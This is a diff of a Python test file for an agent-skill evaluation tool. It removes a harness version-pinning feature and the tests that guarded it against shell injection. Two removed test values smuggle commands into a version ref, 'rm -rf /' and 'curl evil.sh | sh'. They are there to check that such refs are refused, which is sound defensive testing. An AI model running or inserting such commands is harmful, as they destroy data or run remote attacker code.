@@ -42,13 +42,11 @@ from skillscope import (
     structure,
 )
 from skillscope import select as select_module
-from skillscope.datasets import EVALUATIONS_KEY, TRIGGER_KEY, VERSION_KEY
+from skillscope.datasets import EVALUATIONS_KEY, TRIGGER_KEY
 
 SCHEMA_DIR = datasets.PACKAGE_DIR / "schema"
 TRIGGERING = "triggeringEvaluation"
 NON_TRIGGERING = "nonTriggeringEvaluation"
-
-BOOTSTRAP = Path(__file__).resolve().parent.parent / "bootstrap" / "resolve_version.py"
 
 
 def parse(
@@ -182,10 +180,9 @@ class TestSchemaStaysInSyncWithParser(unittest.TestCase):
     def test_top_level_properties_match_parser(self) -> None:
         self.assertEqual(set(self.schema["properties"]), datasets.DATASET_KEYS)
 
-    def test_the_harness_version_pin_is_documented(self) -> None:
-        # It is the one field that changes which code grades a dataset, so an
-        # undocumented one would be invisible to the owners who set it.
-        self.assertIn(VERSION_KEY, self.schema["properties"])
+    def test_a_removed_harness_pin_is_an_unknown_key(self) -> None:
+        _, errors = parse(tier0_dataset("demo", skillscope_version="v1.2.0"))
+        self.assertTrue(any("unknown top-level key" in e for e in errors), errors)
 
     def test_triggering_properties_match_parser(self) -> None:
         self.assertEqual(
@@ -434,8 +431,7 @@ class TestConfig(unittest.TestCase):
                 self.assertIn("--behavior-runner", str(caught.exception))
 
     def test_the_skill_globs_can_come_from_the_environment(self) -> None:
-        # The launcher needs the same answer before the harness exists, so it
-        # passes them this way; the flag still wins.
+        # The action passes the same globs the CLI would take as --skills-dir.
         repo = Repo(self)
         repo.skill("shipped", dataset=tier0_dataset("shipped"), where="agents/skills")
         with mock.patch.dict(os.environ, {config.SKILLS_ENV: "agents/skills/*"}):
@@ -444,12 +440,6 @@ class TestConfig(unittest.TestCase):
                 config.build(repo.root, skills_dir="skills/*").skill_globs,
                 ("skills/*",),
             )
-
-    def test_the_version_comes_from_the_environment_when_unset(self) -> None:
-        repo = Repo(self)
-        with mock.patch.dict(os.environ, {config.VERSION_ENV: "v9.9.9"}):
-            self.assertEqual(config.build(repo.root).version, "v9.9.9")
-            self.assertEqual(config.build(repo.root, version="").version, "")
 
 
 class TestRoutingSet(unittest.TestCase):
@@ -695,114 +685,23 @@ class TestDeadline(unittest.TestCase):
         self.assertIn("behavioral exceeded --timeout", outcome.error)
 
 
-class TestHarnessVersionPin(unittest.TestCase):
-    """Which build of the harness grades a dataset is data, in a reviewable diff."""
-
-    def setUp(self) -> None:
-        self.repo = Repo(self)
-        self.repo.skill("pinned-skill", dataset=tier0_dataset("pinned", skillscope_version="v1.2.0"))
-        self.repo.skill("unpinned-skill", dataset=tier0_dataset("unpinned"))
-        self.repo.activate(version="v1.0.0")
-
-    def test_a_dataset_pin_wins_for_that_skill(self) -> None:
-        self.assertEqual(datasets.pinned_version("pinned-skill"), "v1.2.0")
-
-    def test_an_unpinned_skill_falls_back_to_the_running_version(self) -> None:
-        self.assertEqual(datasets.pinned_version("unpinned-skill"), "v1.0.0")
-
-    def test_routing_uses_the_running_version(self) -> None:
-        # Routing installs several skills in one session, so it cannot honor
-        # several per-skill pins at once.
-        self.assertEqual(datasets.pinned_version(), "v1.0.0")
-
-    def test_the_pin_is_not_mistaken_for_an_evaluation_key(self) -> None:
-        cases, errors = parse(tier0_dataset("demo", skillscope_version="main"))
-        self.assertEqual(errors, [])
-        self.assertEqual(len(cases), 5)
-
-    def test_a_pin_that_is_not_a_git_ref_is_rejected(self) -> None:
-        _, errors = parse(tier0_dataset("demo", skillscope_version="v1 or so; rm -rf /"))
-        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)
-
-    def test_a_non_string_pin_is_rejected(self) -> None:
-        _, errors = parse(tier0_dataset("demo", skillscope_version=1.2))
-        self.assertTrue(any(VERSION_KEY in e for e in errors), errors)
-
-    def test_select_emits_the_version_per_leg(self) -> None:
-        self.repo.skill(
-            "behaving-skill",
-            dataset=tier0_dataset(
-                "behaving",
-                skillscope_version="v3.0.0",
-            )
-            | {
-                EVALUATIONS_KEY: tier0_dataset("behaving")[EVALUATIONS_KEY]
-                + [
-                    {
-                        "id": "behaving-graded",
-                        TRIGGER_KEY: True,
-                        "prompt": "do the thing",
-                        "logs_contain": ["thing.py"],
-                    }
-                ]
-            },
-        )
-        plan = select_module.plan(["behaving-skill"], routing=True, labels=set())
-        self.assertEqual(plan["version"], "v1.0.0")
-        self.assertEqual([leg["version"] for leg in plan["default"]], ["v3.0.0"])
-
-
-class TestBootstrapResolver(unittest.TestCase):
-    """The launcher reads the pin without importing the harness it launches."""
+class TestActionLauncher(unittest.TestCase):
+    """The composite action runs the checkout it was pinned at."""
 
     def setUp(self) -> None:
         import importlib.util
 
-        spec = importlib.util.spec_from_file_location("resolve_version", BOOTSTRAP)
+        path = Path(__file__).resolve().parent.parent / "bootstrap" / "launch.py"
+        spec = importlib.util.spec_from_file_location("skillscope_launch", path)
         self.module = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(self.module)
-        self.repo = Repo(self)
-        self.repo.skill("demo-skill", dataset=tier0_dataset("demo", skillscope_version="v2.0.0"))
 
-    def resolve(self, **kwargs) -> str:
-        return self.module.resolve(root=self.repo.root, **kwargs)
-
-    def test_an_explicit_version_wins(self) -> None:
-        self.assertEqual(self.resolve(requested="v9", env="v8", skill="demo-skill"), "v9")
-
-    def test_the_environment_comes_next(self) -> None:
-        self.assertEqual(self.resolve(requested="", env="v8", skill="demo-skill"), "v8")
-
-    def test_then_the_skill_that_is_being_run(self) -> None:
-        self.assertEqual(self.resolve(requested="", env="", skill="demo-skill"), "v2.0.0")
-
-    def test_a_repo_that_pins_nothing_falls_back_to_the_launcher_ref(self) -> None:
-        empty = Repo(self)
-        self.assertEqual(
-            self.module.resolve(root=empty.root, requested="", env="", skill="", default="bootstrap"),
-            "bootstrap",
-        )
-
-    def test_with_no_pin_and_no_default_it_says_so(self) -> None:
-        empty = Repo(self)
-        with self.assertRaises(SystemExit) as caught:
-            self.module.resolve(root=empty.root, requested="", env="", skill="", default="")
-        self.assertIn("version", str(caught.exception))
-
-    def test_it_finds_a_skill_under_the_globs_it_is_given(self) -> None:
-        repo = Repo(self)
-        repo.skill("odd-place", dataset=tier0_dataset("odd", skillscope_version="v4"), where="agents")
-        self.assertEqual(
-            self.module.resolve(
-                root=repo.root, requested="", env="", skill="odd-place", globs=["agents/*"]
-            ),
-            "v4",
-        )
-
-    def test_a_ref_that_could_be_a_shell_injection_is_refused(self) -> None:
-        # The result is interpolated into a `uvx --from git+...@REF` command.
-        with self.assertRaises(SystemExit):
-            self.resolve(requested="v1; curl evil.sh | sh", env="", skill="")
+    def test_it_installs_from_the_action_checkout(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp).resolve()
+            (root / "pyproject.toml").write_text("[project]\nname = 'x'\n", encoding="utf-8")
+            with mock.patch.dict(os.environ, {"SKILLSCOPE_ACTION_PATH": str(root)}):
+                self.assertEqual(self.module.action_root(), root)
 
 
 class TestSelection(unittest.TestCase):
@@ -840,6 +739,9 @@ class TestSelection(unittest.TestCase):
     def test_only_skills_with_gradeable_behavior_get_a_leg(self) -> None:
         plan = select_module.plan(["alpha", "beta"], routing=True, labels=set())
         self.assertEqual([leg["skill"] for leg in plan["default"]], ["alpha"])
+        self.assertNotIn("version", plan)
+        for leg in plan["default"]:
+            self.assertNotIn("version", leg)
 
     def test_a_touched_skill_is_selected(self) -> None:
         self.assertEqual(
@@ -847,8 +749,8 @@ class TestSelection(unittest.TestCase):
         )
 
     def test_an_infra_path_selects_everything(self) -> None:
-        # The workflow holds the routing set and the version pin, so a change
-        # to it can move any result.
+        # The workflow holds the routing set, so a change to it can move any
+        # result.
         self.assertEqual(
             select_module.select_from_changes({".github/workflows/evals.yml"}),
             ["alpha", "beta"],
